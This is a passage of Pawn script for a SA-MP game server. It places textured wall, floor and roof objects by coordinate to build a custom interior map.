	mariaintaa = CreateDynamicObjectEx(7093,1456.925,-1736.686,1061.078,0.000,0.000,69.971,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1457.715,-1742.944,1050.963,0.000,90.000,359.977,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1456.036,-1739.696,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1456.036,-1739.696,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1456.036,-1739.696,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1456.036,-1742.904,1056.300,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1739.696,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.410,-1739.696,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1456.036,-1742.904,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1450.714,-1742.708,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1456.036,-1746.106,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1456.036,-1739.696,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1456.036,-1746.106,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.301,-1738.958,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.312,-1738.958,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.298,-1738.958,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1457.715,-1747.680,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.308,-1747.057,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.307,-1747.056,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.308,-1747.056,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1456.036,-1746.107,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1459.409,-1739.696,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1739.696,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1457.715,-1752.576,1050.963,0.000,90.000,359.978,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1459.409,-1742.904,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1742.904,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1457.715,-1752.576,1050.956,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1746.106,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1459.409,-1746.106,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1459.409,-1746.106,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.295,-1747.680,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.295,-1747.680,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.295,-1747.680,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1452.397,-1749.357,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1452.397,-1749.357,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1452.397,-1752.566,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1452.397,-1752.566,1056.300,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.128,-1747.680,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1464.127,-1747.680,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.127,-1747.680,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1463.031,-1749.358,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1463.031,-1749.357,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1463.031,-1752.566,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1463.031,-1752.566,1056.300,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1468.212,-1752.576,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1460.296,-1746.021,1061.027,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1460.296,-1749.057,1061.027,0.000,0.000,55.980,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1463.031,-1755.769,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1463.031,-1755.768,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1460.296,-1755.462,1061.077,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1460.296,-1752.421,1061.077,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.761,-1747.680,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1473.761,-1747.680,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1449.673,-1749.057,1061.027,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1449.673,-1746.021,1061.027,0.000,0.000,55.969,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1473.761,-1747.680,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1452.397,-1755.776,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1467.876,-1757.307,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1467.876,-1757.306,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1467.876,-1757.306,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1449.673,-1752.421,1061.027,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1472.608,-1752.499,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1449.673,-1755.462,1061.027,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1472.607,-1752.499,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1472.607,-1752.499,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1457.715,-1747.680,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1447.217,-1752.576,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1457.715,-1757.442,1056.300,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1441.661,-1747.682,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1441.661,-1747.680,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19462,1457.715,-1762.207,1050.979,0.000,90.000,359.978,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 10023, "bigwhitesfe", "archgrnd2_SFE", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1441.660,-1747.600,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1447.500,-1757.306,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1447.500,-1757.306,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1447.500,-1757.306,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.125,-1757.442,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1442.667,-1752.499,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1442.667,-1752.499,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1442.667,-1752.499,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.303,-1757.442,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1451.303,-1757.442,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1451.303,-1757.442,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1467.876,-1757.306,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.125,-1757.442,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1464.125,-1757.442,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1457.715,-1757.442,1052.800,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1452.391,-1755.764,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1457.715,-1762.321,1050.963,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1461.619,-1762.348,1056.949,0.000,0.000,180.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1453.817,-1762.347,1049.948,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1461.619,-1762.347,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19376,1464.716,-1742.708,1050.961,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 18065, "ab_sfammumain", "gun_floor1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1461.619,-1762.347,1049.948,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1453.817,-1762.347,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1453.817,-1762.347,1056.949,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1457.722,-1767.051,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1460.000,-1736.064,1056.916,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1457.722,-1767.051,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1457.721,-1767.050,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1468.869,-1741.103,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1468.869,-1744.313,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1468.869,-1746.718,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1468.869,-1741.103,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1468.869,-1741.103,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1468.869,-1744.313,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1468.869,-1744.313,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19439,1468.869,-1746.717,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1468.869,-1746.717,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.127,-1747.397,1049.948,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1464.127,-1747.397,1053.448,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1464.127,-1747.397,1056.949,0.000,0.000,90.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19379,1451.363,-1742.774,1055.977,0.000,90.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 14674, "civic02cj", "ab_hosWallUpr", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1473.055,-1726.520,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1473.054,-1726.519,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1473.054,-1726.519,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.001,-1734.968,1056.916,0.000,0.000,180.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19435,1460.001,-1734.968,1049.948,0.000,0.000,179.994,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1465.901,-1721.396,1061.078,0.000,0.000,55.969,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1461.066,-1721.396,1061.078,0.000,0.000,55.975,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.602,-1723.188,1049.948,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1468.633,-1723.188,1056.916,0.000,0.000,270.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1460.000,-1714.322,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1460.000,-1714.322,1056.916,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1456.925,-1718.012,1061.078,0.000,0.000,69.982,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(7093,1456.925,-1713.980,1061.078,0.000,0.000,69.982,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.472,-1746.160,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1456.036,-1742.904,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1446.472,-1742.951,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.472,-1739.740,1049.948,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1446.472,-1739.740,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19366,1446.471,-1746.159,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.472,-1739.740,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.472,-1746.159,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19362,1446.472,-1742.950,1056.300,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19391,1446.471,-1726.640,1052.800,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1446.470,-1710.583,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19458,1446.470,-1720.216,1053.448,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 3603, "bevmans01_la", "hottop5d_law", 0);
	mariaintaa = CreateDynamicObjectEx(19454,1446.470,-1710.583,1056.949,0.000,0.000,0.000,250.000,250.000);
	SetDynamicObjectMaterial(mariaintaa, 0, 4830, "airport2", "brnstucco1", 0);
